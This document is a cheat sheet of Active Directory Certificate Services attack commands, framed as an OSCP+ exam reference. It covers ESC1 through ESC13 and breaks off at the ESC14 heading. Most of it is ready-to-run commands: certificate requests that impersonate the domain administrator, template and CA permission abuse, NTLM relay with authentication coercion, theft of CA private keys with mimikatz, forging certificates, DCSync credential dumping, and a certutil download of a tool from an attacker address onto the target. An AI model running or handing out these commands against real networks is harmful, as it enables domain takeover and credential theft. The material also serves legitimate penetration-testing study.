# ADCS ESC1–ESC16 — Complete OSCP+ Exam Reference

This is an exhaustive, copy-paste-ready reference covering every ADCS ESC attack path (1-16), every major tool, every troubleshooting case, and 16 real machine paths. **Bookmark every section header.**

---

# PART 0 — TOOLING INSTALLATION

## 0.1 certipy-ad (primary Linux tool, v5.x covers ESC1-ESC16)
```bash
# pipx (recommended)
sudo apt install -y pipx && pipx ensurepath
pipx install certipy-ad
pipx upgrade certipy-ad
pipx inject --force certipy-ad git+https://github.com/ly4k/ldap3   # LDAP channel-binding patch

# pip / Kali (PEP 668)
pip install certipy-ad --break-system-packages
sudo apt install -y certipy-ad        # binary may be `certipy-ad` not `certipy`

# From git (latest)
git clone https://github.com/ly4k/Certipy && cd Certipy
pip install . --break-system-packages

# Verify
certipy --version       # 5.x
certipy -h
```
Pre-reqs for cryptography compile errors: `sudo apt install build-essential libssl-dev libffi-dev python3-dev krb5-user`. Common errors: `externally-managed-environment` → use pipx/--break-system-packages; `impacket conflict` → `pip install --upgrade impacket`. Subcommands (v5): `account, auth, ca, cert, find, parse, forge, relay, req, shadow, template`.

## 0.2 Certify.exe (Windows / C#)
```cmd
:: Pre-compiled (recommended): https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Certify.exe
:: Compile yourself
git clone https://github.com/GhostPack/Certify
dotnet build -c Release
:: Output: Certify\bin\Release\Certify.exe
:: Host on attacker
sudo impacket-smbserver share . -smb2support
:: Download on target
certutil -urlcache -split -f http://10.10.14.5/Certify.exe C:\Tasks\Certify.exe
```

## 0.3 PKINITtools
```bash
git clone https://github.com/dirkjanm/PKINITtools && cd PKINITtools
pip3 install impacket minikerberos oscrypto
# Files: gettgtpkinit.py, gets4uticket.py, getnthash.py
```

## 0.4 pywhisker
```bash
git clone https://github.com/ShutdownRepo/pywhisker && cd pywhisker
pip install -r requirements.txt --break-system-packages
# Or: pipx install git+https://github.com/ShutdownRepo/pywhisker
```

## 0.5 bloodyAD
```bash
pipx install bloodyAD
# Auth options: -p PASSWORD | -p :NTHASH | -k | -c ':user.pfx' | -c 'cert.crt:cert.key'
```

## 0.6 PassTheCert
```bash
git clone https://github.com/AlmondOffSec/PassTheCert
cd PassTheCert/Python
pip install impacket ldap3 ldapdomaindump --break-system-packages
# Convert PFX→crt+key first:
certipy cert -pfx user.pfx -nokey -out user.crt
certipy cert -pfx user.pfx -nocert -out user.key
```

## 0.7 impacket (ADCS-specific)
```bash
pipx install impacket    # or git clone https://github.com/fortra/impacket
```

## 0.8 Rubeus.exe
```cmd
:: Pre-compiled in SharpCollection. Or:
git clone https://github.com/GhostPack/Rubeus && dotnet build -c Release
```

## 0.9 NetExec / nxc
```bash
pipx install git+https://github.com/Pennyw0rth/NetExec
```

## 0.10 ADCSPwn / ADCSKiller / Coercer / PetitPotam
```bash
git clone https://github.com/topotam/PetitPotam
git clone https://github.com/p0dalirius/Coercer && pip install coercer
git clone https://github.com/Wh04m1001/DFSCoerce
git clone https://github.com/bats3c/ADCSPwn          # automated ESC8
git clone https://github.com/grimlockx/ADCSKiller    # full ESC1/8 chain
wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/printerbug.py
```

---

# PART 1 — UNIVERSAL ENUMERATION

## 1.1 Critical OIDs (memorize)
```
1.3.6.1.5.5.7.3.2          Client Authentication EKU
1.3.6.1.4.1.311.20.2.2     Smart Card Logon EKU
1.3.6.1.5.2.3.4            PKINIT Client Auth EKU
2.5.29.37.0                Any Purpose EKU
1.3.6.1.4.1.311.20.2.1     Certificate Request Agent (Enrollment Agent)
1.3.6.1.4.1.311.25.2       szOID_NTDS_CA_SECURITY_EXT (SID extension, CVE-2022-26923)
```

## 1.2 msPKI-Certificate-Name-Flag bits
```
0x00000001  CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT     ← ESC1 marker
0x00010000  CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME
0x02000000  CT_FLAG_SUBJECT_ALT_REQUIRE_UPN
0x08000000  CT_FLAG_SUBJECT_ALT_REQUIRE_DNS
```

## 1.3 msPKI-Enrollment-Flag bits
```
0x00000002  PEND_ALL_REQUESTS  (Manager Approval ON, blocks ESC1)
0x00080000  CT_FLAG_NO_SECURITY_EXTENSION  ← ESC9 marker
```

## 1.4 certipy find (covers all ESCs)
```bash
certipy find -u user@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -vulnerable -enabled -stdout
certipy find -u user -p 'Pass!' -dc-ip 10.0.0.10 -vulnerable -text -json -bloodhound -output adcs_audit
certipy find -u user -hashes :NT -dc-ip 10.0.0.10 -vulnerable -stdout
certipy find -u user -p 'Pass!' -dc-ip 10.0.0.10 -dc-only -stdout              # CA RPC unreachable
certipy find -u user -p 'Pass!' -dc-ip 10.0.0.10 -scheme ldap                  # LDAPS broken
certipy find -u user -p 'Pass!' -dc-ip 10.0.0.10 -no-ldap-channel-binding -no-ldap-signing
certipy find -u user -p 'Pass!' -dc-ip 10.0.0.10 -hide-admins -oids -stdout    # ESC13 OID data
KRB5CCNAME=user.ccache certipy find -k -no-pass -target dc01.corp.local -dc-ip 10.0.0.10
```

## 1.5 NetExec / Certify / certutil / PowerView
```bash
nxc ldap 10.0.0.10 -u user -p Pass -M adcs
nxc ldap 10.0.0.10 -u user -p Pass -M certipy-find
nxc smb 10.0.0.10 -u user -p Pass -M coerce_plus -o LISTENER=10.10.14.5
```
```cmd
Certify.exe cas
Certify.exe find /vulnerable
Certify.exe find /enrolleeSuppliesSubject /clientauth /currentuser
Certify.exe enum-templates --filter-enabled --filter-vulnerable      :: Certify 2.0
certutil -TCAInfo
certutil -CATemplates -v
certutil -config "CA01\corp-CA" -getreg policy\EditFlags             :: ESC6 detection
certutil -config "CA01\corp-CA" -getreg CA\InterfaceFlags            :: ESC11 detection
certutil -viewstore -enterprise NTAuth                               :: NTAuth check
```
```powershell
Get-DomainCA
Get-DomainCATemplate
Get-DomainCATemplate | ?{$_.Flags -match 'ENROLLEE_SUPPLIES_SUBJECT' -and $_.pkiextendedkeyusage -match 'Client Authentication'}
Import-Module PSPKI; Get-CertificationAuthority | Get-CertificationAuthorityAcl
```

## 1.6 BloodHound edges
`ADCSESC1, ADCSESC3, ADCSESC4, ADCSESC6a/b, ADCSESC9a/b, ADCSESC10a/b, ADCSESC13, ADCSESC14, ADCSESC15`. ESC5/7/8/11/12/16 surface via `WriteOwner/WriteDacl/GenericAll/ManageCA/ManageCertificates/CoerceAndRelayNTLMToADCS` on `EnterpriseCA`/`NTAuthStore`/`RootCA`/`CertTemplate`/`AIACA`/PKI containers.

---

# PART 2 — ESC1: Enrollee Supplies Subject (SAN Impersonation)

**Conditions:** `msPKI-Certificate-Name-Flag` has `0x1`; `pKIExtendedKeyUsage` contains a domain-auth EKU (Client Auth/Smart Card Logon/PKINIT/Any Purpose); `msPKI-Enrollment-Flag` lacks `0x2`; `msPKI-RA-Signature=0`; low-priv principal has Enroll right.

## 2.1 Linux exploitation
```bash
certipy req -u 'attacker@corp.local' -p 'Pass!' -dc-ip 10.0.0.10 \
    -target CA01.corp.local -ca 'CORP-CA' -template 'VulnTemplate' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' -key-size 2048 -out admin
certipy auth -pfx admin.pfx -dc-ip 10.0.0.10
# When PKINIT fails:
certipy auth -pfx admin.pfx -dc-ip 10.0.0.10 -ldap-shell
```
**Full `certipy req` flag set:** `-u/-p/-hashes/-k/-no-pass/-aes` (auth) | `-dc-ip/-dc-host/-target/-target-ip/-ns` (connection) | `-ca/-template` (CA) | `-upn/-dns/-sid/-subject` (SAN) | `-key-size 2048|4096` | `-archive-key/-cax-cert` (key archival) | `-application-policies OID` (ESC15) | `-on-behalf-of 'NETBIOS\user'` (ESC2/3) | `-pfx FILE -pfx-password` (agent cert) | `-renew/-retrieve <id>` | `-web/-dcom/-dynamic-endpoint/-http-scheme/-http-port/-no-channel-binding` (transport) | `-debug`.

**`-upn` vs `-dns`:** `-upn` for users (User template); `-dns` for computers (Machine/DomainController template); `-sid` mandatory after KB5014754 in Full Enforcement.

## 2.2 Windows exploitation
```cmd
Certify.exe request /ca:CA01.corp.local\CORP-CA /template:VulnTemplate /altname:administrator
Certify.exe request /ca:CA01\CORP-CA --upn administrator@corp.local --sid S-1-5-21-...-500   :: Certify 2.0
```
```bash
# Convert PEM → PFX (legacy CSP REQUIRED for Rubeus)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
```cmd
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:"" /domain:corp.local /dc:DC01.corp.local /ptt /nowrap
Rubeus.exe asktgt /user:administrator /certificate:<BASE64> /getcredentials /nowrap   :: UnPAC
klist
dir \\dc01\c$
```

## 2.3 Post-exploitation
```bash
export KRB5CCNAME=admin.ccache
impacket-secretsdump -k -no-pass -just-dc corp.local/administrator@dc01.corp.local
impacket-secretsdump -hashes :NT administrator@10.0.0.10
evil-winrm -i 10.0.0.10 -u administrator -H NTHASH
nxc smb 10.0.0.10 --use-kcache
```

## 2.4 Troubleshooting
| Error | Fix |
|---|---|
| `KDC_ERR_PADATA_TYPE_NOSUPP` ("KDC has no support for padata type") | DC has no PKINIT cert; use `-ldap-shell` or PassTheCert |
| `KDC_ERR_CLIENT_NOT_TRUSTED` | CA not in NTAuth; check `certutil -viewstore -enterprise NTAuth`; or clock skew (sync first!) |
| `KRB_AP_ERR_SKEW` | `sudo ntpdate -u DC_IP` or `faketime "$(rdate -np DC_IP)" certipy ...` |
| `Certificate has no object SID` / SID mismatch | Add `-sid S-1-5-21-...-500`; or chain ESC9/16 |
| `CERTSRV_E_TEMPLATE_DENIED` (0x80094012) | No enroll rights or template not published |
| `LDAP strongerAuthRequired` | `-no-ldap-channel-binding -no-ldap-signing` |

---

# PART 3 — ESC2: Any Purpose EKU

**Conditions:** Template has `2.5.29.37.0` (Any Purpose) or empty EKU. Exploited identically to ESC3 (on-behalf-of). If `ENROLLEE_SUPPLIES_SUBJECT` is also set, collapses into ESC1.

```bash
# Step 1: enroll Any Purpose for self
certipy req -u attacker -p 'Pass!' -ca CORP-CA -template AnyPurposeCert -out attacker
# Step 2: use as enrollment agent on User template
certipy req -u attacker -p 'Pass!' -ca CORP-CA -template User -pfx attacker.pfx \
    -on-behalf-of 'CORP\Administrator' -out administrator
certipy auth -pfx administrator.pfx
```
> `-on-behalf-of` MUST use `NETBIOS\sam` format, never FQDN.

---

# PART 4 — ESC3: Enrollment Agent (Two-Template)

**Conditions:** Template A has Cert Request Agent EKU (`1.3.6.1.4.1.311.20.2.1`); Template B is a v1 client-auth template (User/Machine/DomainController) the target can enroll for.

```bash
# Step 1 — agent cert
certipy req -u attacker -p 'Pass!' -ca CORP-CA -template EnrollmentAgent -out attacker
# Step 2 — on-behalf-of admin via User template
certipy req -u attacker -p 'Pass!' -ca CORP-CA -template User \
    -pfx attacker.pfx -on-behalf-of 'CORP\Administrator' -out administrator
certipy auth -pfx administrator.pfx
```
```cmd
Certify.exe request /ca:CA01\CORP-CA /template:EnrollmentAgent
Certify.exe request /ca:CA01\CORP-CA /template:User /onbehalfof:CORP\Administrator /enrollcert:ea.pfx /enrollcertpw:""
:: Certify 2.0:
Certify.exe request-agent --ca CA01\CORP-CA --template User --target CORP\Administrator --agent-pfx <B64>
```
**Troubleshooting ESC3:** `CERTSRV_E_SIGNATURE_COUNT 0x80094800` → target template is schema v2 with strict policies; chain via ESC15 with `-application-policies "Certificate Request Agent"`.

---

# PART 5 — ESC4: Vulnerable Template ACL

**Conditions:** `WriteDacl/WriteOwner/WriteProperty/GenericAll/GenericWrite/FullControl` on the template AD object. **CRITICAL: always backup first; restore after exploit (exam cleanup).**

## 5.1 Full backup-modify-exploit-restore cycle
```bash
# Step 1 — BACKUP (Certipy 5.x)
certipy template -u attacker -p 'Pass!' -dc-ip 10.0.0.10 \
    -template SecureFiles -save-configuration SecureFiles_backup.json
# Or Certipy 4.x: -save-old (saves AND applies vulnerable config in one step)

# Step 2 — write default vulnerable config (makes it ESC1)
certipy template -u attacker -p 'Pass!' -dc-ip 10.0.0.10 \
    -template SecureFiles -write-default-configuration -force

# Step 3 — exploit as ESC1
certipy req -u attacker -p 'Pass!' -ca CORP-CA -template SecureFiles \
    -upn administrator@corp.local -sid S-1-5-21-...-500
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10

# Step 4 — RESTORE template (CRITICAL)
certipy template -u attacker -p 'Pass!' -dc-ip 10.0.0.10 \
    -template SecureFiles -write-configuration SecureFiles_backup.json -no-save
```

## 5.2 Living-off-the-land (Windows)
```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity "CN=SecureFiles,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -PrincipalIdentity 'corp\attacker' -Rights All
Set-DomainObject -Identity "CN=SecureFiles,..." -Set @{'mspki-certificate-name-flag'=1;'mspki-enrollment-flag'=0;'pkiextendedkeyusage'='1.3.6.1.5.5.7.3.2';'mspki-ra-signature'=0}

# bloodyAD
bloodyAD -d corp.local -u attacker -p 'Pass!' --host 10.0.0.10 \
    set object 'CN=SecureFiles,...' msPKI-Certificate-Name-Flag -v 1
```

## 5.3 ldifde alternative
```cmd
ldifde -m -v -d "CN=SecureFiles,..." -f tmpl_bak.ldf      :: backup
ldifde -i -f mod.ldf                                      :: import modifications
```

---

# PART 6 — ESC5: Vulnerable PKI Object ACL

**Scope:** WriteDacl/WriteOwner/GenericAll on CA computer object, NTAuthCertificates, Templates Container, Enrollment Services Container, CDP, AIA, RootCA. Forest-wide compromise.

## 6.1 Detection
```bash
# Manual LDAP
ldapsearch -H ldap://10.0.0.10 -D 'attacker@corp.local' -w 'Pass!' \
  -b 'CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
  '(objectClass=*)' nTSecurityDescriptor cACertificate
```
```cmd
dsacls "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
dsacls "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
```

## 6.2 Path A — CA Computer Compromise (RBCD/Shadow Creds)
```bash
impacket-addcomputer 'corp.local/user:Pass' -method LDAPS -dc-ip 10.0.0.10 -computer-name 'EVIL$' -computer-pass 'EvilP@ss'
impacket-rbcd 'corp.local/user:Pass' -dc-ip 10.0.0.10 -delegate-from 'EVIL$' -delegate-to 'CA01$' -action write
impacket-getST -spn 'cifs/CA01.corp.local' -impersonate Administrator 'corp.local/EVIL$:EvilP@ss' -dc-ip 10.0.0.10
# OR shadow creds:
certipy shadow auto -u user@corp.local -p 'Pass!' -account 'CA01$' -dc-ip 10.0.0.10
# Then on CA host (SYSTEM): backup CA key
certipy ca -backup -u 'admin@corp.local' -hashes :NT -ca corp-CA -target CA01.corp.local
```

## 6.3 Path B — NTAuthCertificates Write (Forest takeover)
```bash
openssl genrsa -out rogue-ca.key 4096
openssl req -x509 -new -key rogue-ca.key -days 3650 -subj "/CN=Rogue-CA" -out rogue-ca.crt
openssl x509 -in rogue-ca.crt -outform DER -out rogue-ca.der
cat > addca.ldif <<EOF
dn: CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
changetype: modify
add: cACertificate
cACertificate:< file:///tmp/rogue-ca.der
EOF
ldapmodify -H ldaps://10.0.0.10 -D attacker@corp.local -w Pass -f addca.ldif
# Now forge any user cert with the rogue CA
openssl pkcs12 -export -out rogue-ca.pfx -inkey rogue-ca.key -in rogue-ca.crt -passout pass:
certipy forge -ca-pfx rogue-ca.pfx -upn administrator@corp.local -sid S-1-5-21-...-500
certipy auth -pfx administrator_forged.pfx
```

## 6.4 Path C — Templates Container Write (create new vuln template)
Add a `pKICertificateTemplate` LDAP object via `ldapadd`, publish via `certipy ca -enable-template`, then exploit as ESC1.

---

# PART 7 — ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

**Conditions:** CA-wide flag `EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00040000` set in policy module EditFlags. Allows ANY template to honor user-supplied SAN. **Patched by KB5014754 (May 2022)** — works alone only on unpatched DCs or with `StrongCertificateBindingEnforcement < 2`; otherwise chain with ESC9/ESC16.

## 7.1 Detection
```bash
certipy find -u user -p 'Pass' -dc-ip 10.0.0.10 -vulnerable -stdout
# Look for: User Specified SAN: Enabled    ESC6
```
```cmd
certutil -config "CA01.corp.local\corp-CA" -getreg policy\EditFlags
:: vulnerable if EDITF_ATTRIBUTESUBJECTALTNAME2 -- 0x00040000 listed without parens
```

## 7.2 Exploitation
```bash
certipy req -u attacker -p 'Pass!' -ca corp-CA -target CA01.corp.local \
    -template User -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
```
```cmd
Certify.exe request /ca:CA01\corp-CA /template:User /altname:administrator
```

---

# PART 8 — ESC7: Vulnerable CA ACL (ManageCA/ManageCertificates)

**Conditions:** ManageCA right grants CA admin (templates, EditFlags, officers); ManageCertificates lets you approve/deny pending requests.

## 8.1 Full Certipy ESC7 workflow (ManageCA scenario)
```bash
# 1) Self-grant Manage Certificates (Officer)
certipy ca -u raven@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -target dc01.corp.local \
    -ca corp-CA -add-officer raven

# 2) Enable SubCA template
certipy ca -u raven@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -target dc01.corp.local \
    -ca corp-CA -enable-template SubCA

# 3) Request as administrator → DENIED, but generates Request ID + private key file
certipy req -u raven@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -target dc01.corp.local \
    -ca corp-CA -template SubCA -upn administrator@corp.local
# Output: code 0x80094012 CERTSRV_E_TEMPLATE_DENIED, Request ID = 13, Saved 13.key

# 4) Approve the pending request via Manage Certificates
certipy ca -u raven@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -target dc01.corp.local \
    -ca corp-CA -issue-request 13

# 5) Retrieve issued cert (auto-loads 13.key)
certipy req -u raven@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -target dc01.corp.local \
    -ca corp-CA -retrieve 13

# 6) Auth
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
```

**Full `certipy ca` flag reference:** `-ca/-target/-target-ip/-config 'HOST\CA'` | `-list-templates/-enable-template/-disable-template` | `-add-officer/-remove-officer/-add-manager/-remove-manager/-add-officer-sid` | `-issue-request <id>/-deny-request <id>/-list-pending` | `-backup` (extract CA key).

## 8.2 ManageCertificates-only scenario
Cannot self-add officer. Approve a pending request:
```bash
certipy ca -u user -p 'Pass' -ca corp-CA -target CA -list-pending
certipy ca -u user -p 'Pass' -ca corp-CA -target CA -issue-request <ID>
```

## 8.3 Windows / PSPKI alternative
```powershell
Import-Module PSPKI
Get-CertificationAuthority -ComputerName CA01 | Add-CertificationAuthorityOfficer -User 'CORP\raven'
Get-CertificationAuthority -ComputerName CA01 | Get-CATemplate | Add-CATemplate -Name SubCA | Set-CATemplate
Certify.exe request /ca:CA01\corp-CA /template:SubCA /altname:administrator
Get-CertificationAuthority -ComputerName CA01 | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest
Certify.exe download /ca:CA01\corp-CA /id:336
```
Or via `certutil -resubmit "CA01\corp-CA" 336`.

---

# PART 9 — ESC8: AD CS Web Enrollment NTLM Relay

**Conditions:** Web Enrollment role enabled on CA (`/certsrv/`), no EPA/channel binding. `certipy relay` and `ntlmrelayx --adcs` attack the legacy `/certsrv/certfnsh.asp`.

## 9.1 Full relay workflow
```bash
# Terminal 1 — listener (target = DC machine cert)
sudo impacket-ntlmrelayx -t http://10.0.0.20/certsrv/certfnsh.asp \
    --adcs --template DomainController -smb2support
# OR certipy alternative (cleaner; auto-saves PFX)
sudo certipy relay -target 10.0.0.20 -template DomainController

# Terminal 2 — coerce DC to authenticate to listener
python3 PetitPotam.py -d corp.local -u user -p 'Pass!' 10.10.14.5 10.0.0.10
# Unauthenticated (pre-patch CVE-2021-36942):
python3 PetitPotam.py 10.10.14.5 10.0.0.10
# Other coercion options:
python3 printerbug.py corp.local/user:'Pass!'@10.0.0.10 10.10.14.5     # MS-RPRN
python3 dfscoerce.py -u user -p 'Pass!' -d corp.local 10.10.14.5 10.0.0.10  # MS-DFSNM
python3 shadowcoerce.py -u user -p 'Pass!' -d corp.local 10.10.14.5 10.0.0.10
coercer coerce -l 10.10.14.5 -t 10.0.0.10 -u user -p 'Pass!' -d corp.local --always-continue

# Decode base64 PFX from ntlmrelayx output (certipy relay auto-saves)
echo "MIIRX..." | base64 -d > dc01.pfx

# Terminal 3 — auth as DC$ → DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10
impacket-secretsdump -hashes :DC_NT 'corp.local/DC01$@DC01.corp.local' -just-dc
```
**Common ntlmrelayx flags:** `-t URL` | `--adcs --template TEMPLATE` | `-smb2support` | `-socks` (SOCKS proxy) | `--remove-mic` (CVE-2019-1040) | `-wh ATTACKER -wp 80` (WebDAV target).

**Bind 445 trick on Linux:** `echo 0 | sudo tee /proc/sys/net/ipv4/ip_unprivileged_port_start` or stop Samba: `sudo systemctl stop smbd nmbd`.

---

# PART 10 — ESC9: No Security Extension (UPN Modification)

**Conditions:** (1) Template has `CT_FLAG_NO_SECURITY_EXTENSION` (`msPKI-Enrollment-Flag` 0x80000); (2) DC `StrongCertificateBindingEnforcement = 0 or 1`; (3) Attacker has GenericWrite/GenericAll on a VICTIM that can enroll.

## 10.1 Full ESC9 workflow
```bash
# (Optional) Read VICTIM's current UPN
certipy account read -u CONTROLLED@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -user VICTIM

# (Optional) Get VICTIM hash via shadow credentials
certipy shadow auto -u CONTROLLED@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -account VICTIM

# 1) Spoof VICTIM's UPN to target — bare 'administrator', NO @domain
certipy account update -u CONTROLLED@corp.local -p 'Pass!' -dc-ip 10.0.0.10 \
    -user VICTIM -upn 'administrator'

# 2) Request cert as VICTIM
certipy req -u VICTIM@corp.local -hashes :VICTIM_NT -dc-ip 10.0.0.10 \
    -ca CORP-CA -template VulnTemplate
# Output: UPN=administrator, NO SID extension

# 3) RESTORE UPN (mandatory — collisions break auth otherwise)
certipy account update -u CONTROLLED@corp.local -p 'Pass!' -dc-ip 10.0.0.10 \
    -user VICTIM -upn 'VICTIM@corp.local'

# 4) Auth as administrator — MUST pass -domain (cert UPN has no @)
certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 10.0.0.10
```
**`certipy account` actions:** `read | create | update | delete`. Flags: `-user TARGET -upn VAL -dns VAL -sam VAL -spns "..." -pass VAL -group "DN" -user-account-control N`.

## 10.2 bloodyAD / Whisker alternatives
```bash
bloodyAD -u CONTROLLED -p 'Pass!' -d corp.local --host 10.0.0.10 set object VICTIM userPrincipalName -v administrator
bloodyAD -u CONTROLLED -p 'Pass!' -d corp.local --host 10.0.0.10 add shadowCredentials VICTIM
```

## 10.3 Patch impact
- May 2022 → SID extension introduced; default `StrongCertificateBindingEnforcement=1` (Compatibility) → ESC9 still works.
- Feb 2025 → DCs auto-moved to `2` (Full Enforcement). ESC9 alone broken.
- Sept 2025 → registry value removed entirely. Must chain ESC6/ESC16 or ESC14.

---

# PART 11 — ESC10: Weak Certificate Mappings

**Conditions:** Two cases — (1) Kerberos: `Kdc\StrongCertificateBindingEnforcement=0`; (2) Schannel: `Schannel\CertificateMappingMethods` includes `0x4` (UPN). Plus GenericWrite on a victim with enroll rights on ANY client-auth template (no `NoSecurityExtension` needed, unlike ESC9).

## 11.1 Case 1 (Kerberos)
Identical workflow to ESC9 but use default `User` template:
```bash
certipy account update -u CONTROLLED -p 'Pass!' -dc-ip 10.0.0.10 -user VICTIM -upn administrator
certipy req -u VICTIM -hashes :HASH -dc-ip 10.0.0.10 -ca CORP-CA -template User
certipy account update -u CONTROLLED -p 'Pass!' -dc-ip 10.0.0.10 -user VICTIM -upn 'VICTIM@corp.local'
certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 10.0.0.10
```

## 11.2 Case 2 (Schannel — machine accounts only)
Targets must lack a UPN attribute (machine accounts, built-in Administrator). Auth via Schannel/LDAPS only:
```bash
certipy shadow auto -u CONTROLLED -p 'Pass!' -dc-ip 10.0.0.10 -account VICTIM
certipy account update -u CONTROLLED -p 'Pass!' -dc-ip 10.0.0.10 -user VICTIM -upn 'DC$@corp.local'
certipy req -u VICTIM -hashes :HASH -ca CORP-CA -template User
certipy account update -u CONTROLLED -p 'Pass!' -dc-ip 10.0.0.10 -user VICTIM -upn 'VICTIM@corp.local'
certipy auth -pfx dc.pfx -domain corp.local -dc-ip 10.0.0.10 -ldap-shell
```
**LDAP shell built-ins:** `add_computer NAME [PASS]`, `add_user_to_group USER GROUP`, `change_password USER NEW`, `set_rbcd TARGET GRANTEE`, `get_laps_password COMPUTER`, `set_dontreqpreauth USER true`, `grant_control TARGET GRANTEE`, `whoami`.

## 11.3 Variant — DNS mapping (computers, "Scenario B")
```bash
certipy account update -u CONTROLLED -p 'Pass!' -dc-ip 10.0.0.10 -user 'VICTIMPC$' -dns 'dc01.corp.local'
certipy req -u 'VICTIMPC$' -hashes :HASH -ca CORP-CA -template Machine
certipy auth -pfx dc01.pfx -domain corp.local -dc-ip 10.0.0.10
```

---

# PART 12 — ESC11: IF_ENFORCEENCRYPTICERTREQUEST Disabled (RPC Relay)

**Conditions:** CA's `InterfaceFlags` lacks `IF_ENFORCEENCRYPTICERTREQUEST` (0x00000200). Like ESC8 but relays to RPC ICPR endpoint instead of HTTP.

## 12.1 Detection
```bash
certipy find -u user -p 'Pass' -dc-ip 10.0.0.10 -vulnerable -stdout
# Look for: Enforce Encryption for Requests: Disabled  →  ESC11
```
```cmd
certutil -config "CA01\corp-CA" -getreg CA\InterfaceFlags
```

## 12.2 Exploitation
```bash
# Certipy relay (cleanest — auto-saves PFX)
sudo certipy relay -target 'rpc://10.0.0.50' -ca CORP-CA -template DomainController -dc-ip 10.0.0.10

# OR ntlmrelayx
sudo impacket-ntlmrelayx -t 'rpc://10.0.0.50' -rpc-mode ICPR \
    -icpr-ca-name 'CORP-CA' --template DomainController -smb2support

# Coerce
python3 PetitPotam.py -u attacker -p 'Pass!' -d corp.local 10.0.0.99 10.0.0.50
coercer coerce -l 10.0.0.99 -t 10.0.0.50 -d corp.local -u attacker -p 'Pass!' --always-continue

# Auth + DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10
impacket-secretsdump -hashes :DC_NT 'corp.local/DC01$@10.0.0.10'
```

---

# PART 13 — ESC12: Shell Access to CA Server (Golden Certificate)

**Conditions:** SYSTEM/admin shell on CA host, OR ManageCA + local admin via `certipy ca -backup`.

## 13.1 Extraction techniques
```cmd
:: Method 1 — certutil (clean, requires admin)
certutil -backupKey -f -p "Pass!" C:\bk
certutil -exportPFX -p "Pass" My <SERIAL> ca.pfx

:: Method 2 — mimikatz (non-exportable keys; CAPI/CNG patching)
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::cng
mimikatz # crypto::certificates /systemstore:LOCAL_MACHINE /store:MY /export
:: PFX password = "mimikatz"

:: Method 3 — SharpDPAPI
SharpDPAPI.exe certificates /machine
```
```bash
# Method 4 — certipy remote backup (no shell needed if you have CA admin)
certipy ca -backup -u admin@corp.local -hashes :NT -dc-ip 10.0.0.10 -ca corp-CA -target CA01.corp.local
# Output: corp-CA.pfx
```

## 13.2 Forge arbitrary certs
**Full `certipy forge` flags:** `-ca-pfx FILE -ca-pfx-password X` (CA cert, REQUIRED) | `-upn/-dns/-sid/-subject` (target identity) | `-template FILE` (clone extensions from real cert) | `-issuer NAME` | `-crl URL` | `-serial HEX` | `-application-policies OID` | `-validity-period DAYS` | `-key-size 2048` | `-out FILE -pfx-password`.

```bash
certipy forge -ca-pfx CORP-CA.pfx \
    -upn 'administrator@corp.local' \
    -sid 'S-1-5-21-...-500' \
    -crl 'ldap:///' \
    -subject 'CN=Administrator,CN=Users,DC=corp,DC=local' \
    -out administrator_forged.pfx
certipy auth -pfx administrator_forged.pfx -dc-ip 10.0.0.10
```
**ForgeCert (Windows alt):**
```
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "pass" \
    --Subject "CN=User" --SubjectAltName "administrator@corp.local" \
    --NewCertPath admin.pfx --NewCertPassword "pass"
```

**YubiHSM2 specific:** Cleartext password leak: `reg query "HKLM\SOFTWARE\Yubico\YubiHSM" /v AuthKeysetPassword`. **TPM-protected keys cannot be exfiltrated** — abuse the running CA process via `certreq`.

---

# PART 14 — ESC13: OID Group Link (msDS-OIDToGroupLink)

**Conditions:** Template links to issuance policy OID with `msDS-OIDToGroupLink` set to a privileged Universal group's DN. Authentication adds the group SID to the PAC.

## 14.1 Detection & exploit
```bash
certipy find -u user@corp.local -p 'Pass!' -dc-ip 10.0.0.10 -vulnerable -oids -stdout
# Look for: ESC13 ... Linked Groups: CORP\Enterprise Admins

certipy req -u attacker -p 'Pass!' -ca corp-CA -template ESC13Template
certipy auth -pfx attacker.pfx        # PAC has extra SID
export KRB5CCNAME=attacker.ccache
secretsdump.py -k -no-pass -just-dc CORP/attacker@dc01
```

## 14.2 Modify OID link if you have GenericWrite
```bash
bloodyAD --host dc01 -d corp.local -u user -p pass set object \
    'CN=<PolicyOID>,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
    msDS-OIDToGroupLink -v 'CN=Enterprise Admins,CN=Users,DC=corp,DC=local'
```

---

# PART 15 — ESC14: Explicit Mapping Abuse (altSecurityIdentities)

